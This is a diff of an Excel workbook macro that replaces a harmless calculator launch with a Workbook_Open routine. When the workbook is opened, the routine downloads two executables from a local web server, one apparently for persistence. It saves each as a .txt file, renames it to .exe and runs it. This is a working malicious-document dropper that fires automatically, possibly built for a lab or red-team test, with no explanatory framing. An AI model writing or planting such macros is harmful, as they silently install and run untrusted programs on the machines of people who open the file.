@@ -1,10 +1,43 @@
 Private Sub Workbook_Open()
-    Dim Program As String
-    Dim TaskID As Double
-    On Error Resume Next
-    Program = "calc.exe"
-    TaskID = Shell(Program, 1)
-    If Err <> 0 Then    
-        MsgBox "Can't start " & Program
-    End If
+    Dim FileUrl As String
+         Dim objXmlHttpReq As Object
+         Dim objStream As Object
+    
+         FileUrl = "http://localhost:5000/download/exe/test.exe"
+    
+         Set objXmlHttpReq = CreateObject("Microsoft.XMLHTTP")
+         objXmlHttpReq.Open "GET", FileUrl, False, "username", "password"
+         objXmlHttpReq.send
+    
+         If objXmlHttpReq.Status = 200 Then
+              Set objStream = CreateObject("ADODB.Stream")
+              objStream.Open
+              objStream.Type = 1
+              objStream.Write objXmlHttpReq.responseBody
+              objStream.SaveToFile ThisWorkbook.Path & "\" & "file.txt", 2
+              objStream.Close
+         End If
+         
+     FileCopy ThisWorkbook.Path & "\" & "file.txt", ThisWorkbook.Path & "\" & "file.exe"
+     
+     Shell ThisWorkbook.Path & "\" & "file.exe", vbNormalFocus
+     
+     
+     FileUrl = "http://localhost:5000/download/exe/persistant_ping.exe"
+    
+         Set objXmlHttpReq = CreateObject("Microsoft.XMLHTTP")
+         objXmlHttpReq.Open "GET", FileUrl, False, "username", "password"
+         objXmlHttpReq.send
+    
+         If objXmlHttpReq.Status = 200 Then
+              Set objStream = CreateObject("ADODB.Stream")
+              objStream.Open
+              objStream.Type = 1
+              objStream.Write objXmlHttpReq.responseBody
+              objStream.SaveToFile ThisWorkbook.Path & "\" & "file.txt", 2
+              objStream.Close
+         End If
+         
+     FileCopy ThisWorkbook.Path & "\" & "file.txt", ThisWorkbook.Path & "\" & "persist.exe"
+     Shell ThisWorkbook.Path & "\" & "persist.exe", vbNormalFocus
 End Sub
